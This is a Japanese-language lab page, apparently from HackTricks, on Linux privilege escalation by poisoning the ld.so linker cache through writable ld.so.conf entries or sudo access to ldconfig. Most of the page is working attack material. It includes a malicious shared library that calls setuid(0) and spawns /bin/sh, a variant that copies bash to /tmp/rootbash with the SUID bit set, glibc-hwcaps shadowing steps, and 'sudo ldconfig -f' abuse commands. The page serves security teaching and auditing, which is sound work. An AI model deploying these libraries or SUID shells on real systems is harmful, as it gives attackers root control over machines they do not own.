# ld.so privesc exploitの例

このページは、**`/etc/ld.so.conf` または `ldconfig` を通じた system linker cache の poisoning**に特化した lab です。missing-library injection、writable `RPATH`/`RUNPATH`、`LD_PRELOAD`、その他の一般的な SUID linker abuse については、[SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md)を参照してください。

## 環境の準備

以下のセクションでは、環境の準備に使用するファイルの code を確認できます。

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. 同じフォルダー内に、これらのファイルをマシン上で**作成**します
2. **library**を**コンパイル**します: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so`を`/usr/lib`に**コピー**し、cacheを更新します: `sudo cp libcustom.so /usr/lib && sudo ldconfig`（root privs）
4. **executable**を**コンパイル**します: `gcc sharedvuln.c -o sharedvuln -lcustom`

### 環境を確認する

_libcustom.so_が_/usr/lib_から**ロード**され、binaryを**実行**できることを確認します。
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Useful triage commands

実際の target を攻撃する際は、binary が必要とする **exact library name**、loader が **currently resolving** している対象、および live cache を変更せずに書き込み可能な configured paths を確認します。<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
`ldd` は**trusted**な実行ファイルに対してのみ使用してください。実装によっては、または通常とは異なる ELF interpreter によっては、攻撃者が制御する code を実行してしまう可能性があります。`objdump -p ./file | grep NEEDED` を使えば、直接の dependencies を安全に一覧表示できます。trusted な target では、検出した interpreter を `--list` とともに実行すると、実際の resolution を確認できます。<sup>[[4]](#references)</sup>

役立つ注意点をいくつか示します。

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` は、通常**機能しません**。redirection は現在の shell によって実行されるためです。代わりに
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` を使用してください。
- **SUID/privileged** binary は **secure-execution mode** で実行されます。`LD_LIBRARY_PATH`
は無視され、`LD_PRELOAD` には制限があります（slash を含む名前は無視され、standard directory にある setuid-marked library のみ preload できます）。root が `ldconfig` を実行すると、`/etc/ld.so.conf` に記載された directory が `/etc/ld.so.cache` に追加される可能性があるため、この misconfiguration は依然として privileged program に影響を与えることがあります。<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` も secure-execution mode では無視されます。ただし `/etc/suid-debug` が存在する場合を除きます。そのため、privileged execution からの output を期待するのではなく、同等の non-SUID 実行から trace を取得してください。<sup>[[1]](#references)</sup>
- glibc 2.33 以降では、dynamic loader に `--list-diagnostics` も用意されています。これは、hijack が期待どおりに動作しない場合に、machine-readable な loader diagnostics と組み込みの search-path 情報を出力します。<sup>[[1]](#references)[[6]](#references)</sup>

### Cache と SONAME の制約

`ldconfig` は、configured directory 内の任意の file をすべて cache するわけではありません。ELF header を調べ、`lib*.so*` または `ld-*.so*` に一致する名前を認識し、通常の `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12` chain を想定します。したがって、injected object には target の architecture/class、正確な `DT_NEEDED` name（通常はその `DT_SONAME`）、および victim が resolve するすべての symbol/version が必要です。<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Prefer a target-specific library such as this example. 不完全な object で一般的な SONAME を shadowing すると、意図した privileged target の実行前にその SONAME を解決するすべての process が破損する可能性があります。<sup>[[3]](#references)</sup>

## Exploit

この scenario では、administrator が、システムの
`/etc/ld.so.conf` によって include される
`/etc/ld.so.conf.d/` 配下の file に、vulnerable な
entry を追加したとします。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
脆弱なフォルダーは _/home/ubuntu/lib_ です（ここでは書き込み権限があります）。\
**このパス内で以下のコードをダウンロードしてコンパイルします**：
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
後で **root**（または別の特権アカウント）が脆弱なバイナリを実行すると予想される場合は、通常、インタラクティブシェルを起動するよりも **root** 所有のアーティファクトを残すほうが適切です。例えば:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
その後、privileged execution が実行されたら、`/tmp/rootbash -p` を使用できます。

**misconfigured** なパス内に悪意のある libcustom library を**作成した**ので、default cache は、privileged な **`ldconfig`** の実行が成功した後に再構築される必要があります。reboot は、ローカルの boot process が実際にこれを呼び出す場合にのみ有効です。それ以外の場合は、administrator の操作を待つか、利用可能であれば unsafe な sudo rule を使用してください。<sup>[[2]](#references)</sup>

これが発生したら、`sharedvuln` executable が `libcustom.so` library をどこから load しているかを**再確認**します。
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
ご覧のとおり、これは **`/home/ubuntu/lib` からロードされており**、ユーザーが実行すると shell が実行されます:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> この例ではまだ privileges を escalate していない点に注意してください。ただし、実行される commands を変更し、**root またはその他の privileged user が vulnerable binary を実行するのを待つ**ことで、privileges を escalate できます。

### Modern `glibc-hwcaps` shadowing

glibc 2.33 以降、loader は **すべての library search directory** 内にある `glibc-hwcaps/<level>/` 以下の optimized libraries を優先できます。そのため、`/home/ubuntu/lib` だけを確認するのは不十分です。たとえば、`/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/` のような writable な compatible subdirectory は、`ldconfig` がその中の library を index した後に base library を shadow できます。一方、別の CPU では base object が引き続き使用されます。これにより architecture-selective な hijack も可能になり、別の CPU で validation を行うと見逃す可能性があります。<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
現在の glibc hardening guidance では、重複する SONAME、デフォルト以外の search location、および `glibc-hwcaps` サブディレクトリ内のオブジェクトを避けることが推奨されています。Audit の観点では、設定されたディレクトリとその親パスの各コンポーネントに対して、所有者と writeability のチェックを再帰的に適用してください。<sup>[[3]](#references)</sup>

### その他の misconfigurations - Same vuln

前の例では、administrator が **`/etc/ld.so.conf.d/` 内の configuration file に、non-privileged folder を設定した**という misconfiguration を偽装しました。\
しかし、同じ vulnerability を引き起こす可能性がある misconfiguration は他にもあります。ロードされる **config file** に対する **write permissions** がある場合、書き込み可能な `/etc/ld.so.conf.d/` ディレクトリ内に file を作成できる場合、または `/etc/ld.so.conf` に書き込める場合、同じ vulnerability を設定して exploit できます。<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**`ldconfig` に対する sudo privileges があるとします**。\
`-f` を指定することで、`ldconfig` に **どの configuration file を読み込むか**を指示できます。そのため、attacker-controlled directories を指定する file によって、`ldconfig` にそれらの folder を cache に追加させることができます。<sup>[[2]](#references)</sup>\
それでは、"/tmp" をロードするために必要な files と folders を作成しましょう。
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
ここで、**previous exploit** で示したように、**malicious library** を `/tmp` 内に作成します。\
最後に、パスを読み込み、バイナリがどこから library を読み込んでいるかを確認します:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**ご覧のとおり、`ldconfig` に対する sudo privileges があれば、同じ vulnerability を exploit できます。制限された sudo rule を評価する際は、オプションの詳細が重要です。`-f` は別の configuration を選択しますが、それでも `/etc/ld.so.cache` を再構築します。`-C` は cache の保存先を別の場所に変更します。`-N` は cache の再構築を防ぎます。`-X` は link の更新を防ぎますが、**`-N` と組み合わせない限り、cache は再構築されます**。<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Dynamic Linker Hardening - The GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux manual page](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Dynamic Linker Diagnostics (The GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
{{#include ../../banners/hacktricks-training.md}}
